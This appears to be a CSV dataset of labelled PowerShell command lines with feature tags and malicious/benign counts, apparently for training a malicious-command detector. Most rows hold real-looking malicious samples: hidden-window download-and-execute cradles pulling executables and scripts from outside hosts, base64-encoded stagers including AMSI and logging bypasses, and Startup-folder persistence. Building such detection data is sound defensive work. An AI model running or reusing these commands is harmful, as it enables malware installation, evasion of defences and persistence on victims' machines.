tags,mal_cnt,ben_cnt,example
arg_-; arg_-nop; arg_-win; arg_1; normal_entropy; normal_string_len; parentprocess_cmd.exe,1,1,WindowspOwErshEll\v1.0\pOwErshEll  -nop -win 1 -
arg_-enc; arg_-nop; arg_-w; arg_1; normal_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,-noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBJAG8ATgBUAEEAQgBMAGUALgBQAFMAVgBFAHIAcwBpAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBiAEwAeQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEAbAB1AGUAKAAkAE4AVQBsAGwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBsAD0AWwBDAG8ATABsAEUAQwB0AEkAbwBOAHMALgBHAEUAbgBlAHIAaQBjAC4ARABpAGMAdABJAG8AbgBBAHIAeQBbAHMAdAByAGkAbgBnACwAUwB5AFMAdABlAG0ALgBPAEIAagBlAGMAVABdAF0AOgA6AE4ARQBXACgAKQA7ACQAVgBBAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAEUAewBbAFMAYwByAGkAcABUAEIAbABPAEMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAGwAVQBlACgAJABOAHUATABMACwAKABOAEUAVwAtAE8AQgBqAEUAYwBUACAAQwBPAEwATABlAGMAVABpAG8ATgBzAC4ARwBFAE4AZQByAGkAYwAuAEgAYQBTAGgAUwBFAHQAWwBTAHQAUgBJAG4AZwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAcwBTAEUATQBiAEwAeQAuAEcAZQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBpAEUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAG4AVQBsAEwALAAkAHQAUgBVAEUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAG0ALgBOAGUAdAAuAFMAZQByAFYASQBjAEUAUABPAEkATgB0AE0AYQBuAEEARwBlAHIAXQA6ADoARQBYAHAARQBDAFQAMQAwADAAQwBPAG4AVABpAG4AVQBFAD0AMAA7ACQAVwBjAD0ATgBlAHcALQBPAEIAagBFAEMAdAAgAFMAWQBzAHQARQBNAC4ATgBlAHQALgBXAEUAYgBDAGwASQBFAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBhAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAcgBvAFgAWQA9AFsAUwB5AFMAdABFAG0ALgBOAGUAdAAuAFcAZQBCAFIAZQBxAFUARQBTAFQAXQA6ADoARABlAEYAQQBVAEwAVABXAEUAYgBQAFIAbwBYAFkAOwAkAHcAYwAuAFAAcgBvAFgAWQAuAEMAUgBlAGQAZQBuAFQAaQBBAEwAUwAgAD0AIABbAFMAeQBTAHQARQBtAC4ATgBFAFQALgBDAHIAZQBkAGUAbgB0AGkAYQBMAEMAYQBDAEgAZQBdADoAOgBEAEUARgBBAHUAbAB0AE4ARQBUAFcAbwByAGsAQwBSAGUAZABFAG4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABFAE0ALgBUAEUAeAB0AC4ARQBuAEMAbwBEAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQBUAGUAcwAoACcANAAzADMANwAwADAAZAAxADcAMgBiADAAOAA2AGYANAA1ADIAMwA1ADcAMwBjAGYAYQBiAGUAZQA0AGUAZgBhACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdAA9ACcARQBtADIALQB2AGUAWgB0ADkANABBAEEAQQBBAEEAQQBBAEEAQQBBAEMAVgBBAHUASABfAGoARwBKADMAQwBVAGkAbgBDAHgAegB1AEcAYwBuAGwAUgBHAFEAaQB4AEIAcQBXAGcARgBUAEQAbABoAGsAOAAxAEgAUwBDAFEAUgAnADsAJAB3AEMALgBIAEUAQQBEAEUAcgBzAC4AQQBkAEQAKAAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgAsACIAQgBlAGEAcgBlAHIAIAAkAHQAIgApADsAJABXAGMALgBIAEUAQQBEAGUAUgBTAC4AQQBEAGQAKAAiAEQAcgBvAHAAYgBvAHgALQBBAFAASQAtAEEAcgBnACIALAAnAHsAIgBwAGEAdABoACIAOgAiAC8ARQBtAHAAaQByAGUALwBzAHQAYQBnAGkAbgBnAC8AZABlAGIAdQBnAHAAcwAiAH0AJwApADsAJABkAGEAdABBAD0AJABXAEMALgBEAE8AVwBOAGwAbwBhAGQARABhAFQAYQAoACcAaAB0AHQAcABzADoALwAvAGMAbwBuAHQAZQBuAHQALgBkAHIAbwBwAGIAbwB4AGEAcABpAC4AYwBvAG0ALwAyAC8AZgBpAGwAZQBzAC8AZABvAHcAbgBsAG8AYQBkACcAKQA7ACQAaQB2AD0AJABkAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAdABhAFsANAAuAC4AJABkAGEAdABBAC4AbABlAE4ARwB0AGgAXQA7AC0ASgBvAEkATgBbAEMASABBAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
low_entropy; parentprocess_mshta.exe; very_high_string_len,1,0,""" pOWerSHell.exe -eXuNreSTRIctEd              -Nol  -whidDEN                                                                  -eCCQAgAAwAIAAgAAwADAAgACAAIAAMACAAIAAgAAkAcwBlAFQALQBjAG8ATgB0AGUATgB0ACAACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAC0AdgBBACAACwALACAACwAMAAkACQAJAAkADAAJACAAIAAMAAwADAAJACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAkATgBFAFcALQBPAGIAagBFAEMAdAAJAAwACwAMAAwACwAMAAsACwALAAsACwALAAwADAAMAAsADAALAAwACwAMAAwADAAMAAwACwALAAsADAALAAwACwAMAAwADAALAAsACwAMAAsADAAMAAsACwAMAAsACwAMAAwACwAMAAwAIABTAFkAUwB0AEUAbQAuAG4AZQBUAC4AVwBlAGIAYwBMAGkARQBuAFQACQAJAAsACwALAAwAIAAgAAwACwAJACAACQAMACAACQAJAAwADAAJAAsACwAgAAsADAAMAAkACwAgACAACwALAAsADAAgAAwADAAgAAwACQAgAAwADAAMAAkACwAgAAkACwAgAAkADAALAAsAIAAJACAAIAAJAAkACwAMACAADAAgAAkACQApAC4ARABPAHcAbgBMAG8AYQBkAGQAYQBUAEEAKAAJAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALAAsACwALACAAHSBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAHUAdAB0AHkALgBlAHgAZQAdIAkADAAMAAwADAAMACAAKQAJACAAIAALAAsACwAgAAsACwALACAALQBFAE4ACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAgAGIAeQBUAGUAIAALAAsADAAMAAsADAAMAAsACwAMAAwACwALAAwADAAMAAwACwAMAAsACwALAAsACwAMAAwADAALAAsADAAMAAwADAALAAsACwAMAAwADAALAAsACwAMAAwACwALAAwADAALAAsACwALAAsADAAMAAwADAALAAwACwALAAwADAALACAALQBwAGEAVABoAAkAIAALAAsAIAALACAACwALAAsACwALAAsACwAgAAsAIAALACAACwAgACAACwALACAACwALACAAIAAgACAAIAALAAsAIAALACAAIAALACAACwALAAsACwAgAAsACwAgACAACwAgACAACQAdICQARQBOAFYAOgBUAEUATQBQAFwAbwB1AHQAcAB1AHQAaQBuAGcALgBlAHgAZQAdIAkAIAAgACAACQAgAAkAIAAgAAkAIAAJAAkACQAgAAkAOwAJAAsACwALAAsACwALAAkACQAJAAsACQALAAkACwALAAkACQAJAAsACQALAAsACQALAAkACQAJAAkACwAJAAkACwAJAAsACwAgAGMATQBEAAkACwAgAAsAIAALAAsACwAgAAsACwAgACAALwBDAAkACwAgAAkAIAAJAAsACwAgAAkAHSAkAGUAbgB2ADoAdABlAG0AUABcAG8AdQB0AHAAdQB0AGkAbgBnAC4AZQB4AGUAHSA=   """
arg_10; low_entropy; low_string_len; parentprocess_mshta.exe,1,2,Start-Sleep -m 10
arg_-executionpolicy; arg_-windowstyle; arg_bypass; arg_hidden; arg_stop-process; ext_exe;; normal_entropy; parentprocess_cmd.exe; very_high_string_len,1,1,"-ExecutionPolicy bypass -WindowStyle Hidden $tp=Test-Path $env:APPDATA\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe; if(!$tp){(New-Object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe',$env:APPDATA + '\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe'); Start-Process $env:APPDATA\puttggggyeeeeeeeeeeeeeeidfgngdddd.exe;} Stop-Process -processname mshta;"
arg_-e; arg_-w; arg_1; low_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,-w 1 -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA5ADEALgAyADEAMAAuADEAMAA0AC4AMgA0ADcALwBlAG0AbwB0AGUAdAAuAGEAbgBhAGwALgBkAGUAcwB0AHIAbwB5AGUAcgAuAHQAeAB0ACcAKQApADsASQBuAHYAbwBrAGUALQBHAGEAbgBkAEMAcgBhAGIAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAMAAwADAAMAAwADsA
arg_-executionpolicy; arg_-windowstyle; arg_bypass; arg_hidden; arg_powershell; ext_exe}; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,powershell  -windowstyle hidden -ExecutionPolicy Bypass Invoke-Command -ScriptBlock {.\svc.exe}
arg_-command; arg_-windowstyle; arg_hidden; arg_powershell; dir_%appdata%; ext_exe); parentprocess_cmd.exe; very_high_entropy; very_high_string_len,1,25,"powershell  -windowstyle hidden -command ""$clnt = new-object System.Net.WebClient; $clnt.DownloadFile(\""https://goo.gl/ZFaA5y\"", \""%APPDATA%\teste\Bat_To_Exe_Converter_(x64).exe\"")"""
arg_-com; arg_5; dir_%public%; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_122); ext_90); ext_db); ext_lnk; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"$FuNcTiOnS_yeYIdtDX = 'C:\Users\Public\'+ (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));$FuNcTiOnS_xnMrYgAkepmLuh = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));New-Item -Path $FuNcTiOnS_yeYIdtDX -ItemType Directory -ErrorAction SilentlyContinue;(nEw-oBjEcT nEt.wEbcLiEnT).DownloadFile('https://raw.githubusercontent.com/sedex10/pbk/master/IoD.zip',$FuNcTiOnS_yeYIdtDX+'\'+ $FuNcTiOnS_xnMrYgAkepmLuh + '.zip');(new-object -com shell.application).namespace($FuNcTiOnS_yeYIdtDX).CopyHere((new-object -com shell.application).namespace($FuNcTiOnS_yeYIdtDX+'\'+ $FuNcTiOnS_xnMrYgAkepmLuh + '.zip').Items(),16); Rename-Item -Path ($FuNcTiOnS_yeYIdtDX + '\IoD.exe') -NewName ($FuNcTiOnS_xnMrYgAkepmLuh+'.exe'); Rename-Item -Path ($FuNcTiOnS_yeYIdtDX + '\file2.tmp') -NewName ('Syste'+$FuNcTiOnS_xnMrYgAkepmLuh+'.db');$FuNcTiOnS_LrwCdF = ($FuNcTiOnS_yeYIdtDX + '\\' +$FuNcTiOnS_xnMrYgAkepmLuh+'.exe');($FuNcTiOnS_yeYIdtDX +'\Syste' + $FuNcTiOnS_xnMrYgAkepmLuh + '.db') | Out-File -filepath ($env:APPDATA + '\LogPRO');$FuNcTiOnS_wqJN=(New-Object -COM WScript.Shell).CreateShortcut(($env:APPDATA) + '\Microsoft\Windows\Start Menu\Programs\Startup\' +$FuNcTiOnS_xnMrYgAkepmLuh+'.lnk' );$FuNcTiOnS_wqJN.TargetPath=$FuNcTiOnS_yeYIdtDX +'\' +$FuNcTiOnS_xnMrYgAkepmLuh+'.exe';$FuNcTiOnS_wqJN.Save();cmd /K $FuNcTiOnS_LrwCdF"
dir_%appdata%; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_vbs; high_entropy; parentprocess_cmd.exe; very_high_string_len,1,0,"-EXByPASs-noP-whIdDeN(NeW-oBJEcT SySTEm.NeT.wEbcLIenT).DOwnLOADfIlE('http://orders.etrade.website/30/WinUpdateBatchXX2018.vbs' ,'C:\Users\HAPUBWS\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateBatchX2018.vbs');STarT'C:\Users\HAPUBWS\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateBatchX2018.vbs'"""
arg_-ec; arg_-nop; arg_-w; arg_bypass; arg_hidden; low_entropy; parentprocess_wscript.exe; very_high_string_len,1,0,-eX BYpaSs -nOp -w hidden -Ec IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBUAC0AYwBPAE4AVABFAE4AVAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQB2AEEATABVAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACgAbgBlAFcALQBPAGIAagBlAGMAVAAgAFMAWQBTAFQAZQBtAC4AbgBlAHQALgB3AEUAQgBjAEwASQBFAE4AdAApAC4ARABPAFcATgBMAG8AQQBkAHMAVAByAGkAbgBnACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAB0gaAB0AHQAcABzADoALwAvAHMAYQBsAGUAcwBvAGwAdQB0AG4ALgBnAGQAbgAvAEcAUwBjAHIAaQBwAHQAUABhAGcAZQBzAC8AeABCAGEAdABjAGgANgA0AEIAaQB0AFMAeQB0AGUAbQAuAGUAeABlAB0gIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ARQBuAGMATwBEAEkAbgBnACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFQAcgBpAE4ARwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQBwAEEAdABoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAdICQARQBuAFYAOgBhAHAAcABkAEEAdABBAFwAeABCAGEAdABjAGgANgA0AEIAaQB0AFMAeQB0AGUAbQBzAC4AZQB4AGUAHSAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBUAEEAcgB0ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAdICQARQBuAHYAOgBhAFAAcABkAGEAdABhAFwAeABCAGEAdABjAGgANgA0AEIAaQB0AFMAeQB0AGUAbQBzAC4AZQB4AGUAHSA=
arg_-enc; arg_-w; arg_hidden; normal_entropy; very_high_string_len,1,13,-w hidden -enc JAB0AD0AKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQwBlAHIAdAAuAGwAbgBrACIAKQAgAC0AcwBwAGwAaQB0ACAAIgBEAEUAQQBEAEIARQBFAEYAIgA7AGkAZQB4ACAALQBjACAAJAB0AFsANABdAA==
low_entropy; normal_string_len; parentprocess_powershell.exe,1,139,=new-object Net.WebClient
arg_hidden; arg_iex; high_entropy; high_string_len; parentprocess_wscript.exe,1,158,-window hidden IEX (New-Object Net.webclient).downloadString('http://mynetwork.ddns.net:880/registry.ps1');
arg_-executionpolicy; arg_-file; arg_-noprofile; arg_bypass; arg_powershell; dir_%temp%; ext_ps1; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"""powershell"" -NoProfile -ExecutionPolicy Bypass -File  %TEMP%\1\A56D.tmp.ps1"
